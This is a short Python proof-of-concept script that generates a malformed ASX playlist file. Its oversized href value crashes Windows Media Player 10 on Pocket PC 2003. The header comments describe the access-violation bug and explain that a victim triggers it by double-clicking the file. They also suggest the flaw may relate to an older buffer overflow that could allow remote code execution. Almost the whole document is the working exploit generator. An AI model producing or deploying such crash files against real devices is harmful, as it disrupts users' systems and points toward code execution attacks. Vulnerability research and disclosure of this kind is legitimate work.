#WMP10PPCPOC.py
#Author: Elias Augusto
#Python 2.7 Script, tested on Windows
#Generates POC file used to trigger a DOS bug in Windows Media Player 10 for Pocket PC
#Tested and verified on: Pocket PC 2003 Second Edition (Windows CE 4.2)
#Description: Malformed href link in <REF/> header in ASX xml playlist file triggers an unhandled access violation, a crash, and renders the system unable to open Windows Media Player until restart
#Note: Windows Media Player 10 for Pocket PC must be opened with the Playlist file as an argument
# Due to automatic filetype associations, this can be accomplished by having a victim double click on the playlist file as they would to open an MP3 or WMA file from the file explorer
# This exploit generally does not work if the playlist file is opened by WMP after it is started independently, as it attacks it during the startup state of execution
#Impact: Low, though likely a variant of CVE-2000-1113 (buffer overflow in Windows Media Player 7 ASX processing on Windows NT) that could lead to RCE is investigated further


crash="A"*3000 #String of A's used to crash

standard="<ASX version = \"3.0\">\r\n" #Tabs and newline characters aren't necessary but do make for nice formatting
standard+="\t\t<PARAM NAME = \"Encoding\" VALUE = \"ANSI\" />\r\n"
standard+="\t\t<PARAM NAME = \"Custom Playlist Version\" VALUE = \"V1.0 WMP8 for CE\" />\r\n"
standard+="\t<ENTRY>\r\n"
standard+="\t\t<ref href = \"\\" #Required to trigger crash
standard+=crash
standard+="\" />\r\n"
standard+="\t\t<ref href = \".\\Program Files\\Windows Media Player\\Welcome To Windows Media.wma\" />\r\n"
standard+="\t</ENTRY>\r\n"
standard+="</ASX>"

f = open("wmpcrashdemo3G.asx","w+")
f.write(standard)
f.close()
